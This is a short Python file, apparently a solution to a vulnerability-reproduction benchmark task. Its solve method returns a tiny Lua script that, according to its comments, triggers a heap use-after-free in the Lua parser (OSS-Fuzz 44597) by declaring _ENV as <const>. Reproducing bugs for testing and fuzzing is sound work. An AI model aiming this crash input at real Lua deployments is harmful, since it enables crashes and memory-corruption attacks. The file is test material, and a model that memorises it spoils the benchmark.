import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PoC for Lua _ENV <const> Heap Use After Free (arvo:44597 / OSSFuzz-44597)
        # The vulnerability is in the Lua compiler (lparser.c) handling of _ENV declared as <const>
        # when other upvalues are present.
        poc = (
            "local x\n"
            "local function f()\n"
            "  local _ENV <const> = 1\n"
            "  return x\n"
            "end\n"
        )
        return poc.encode('utf-8')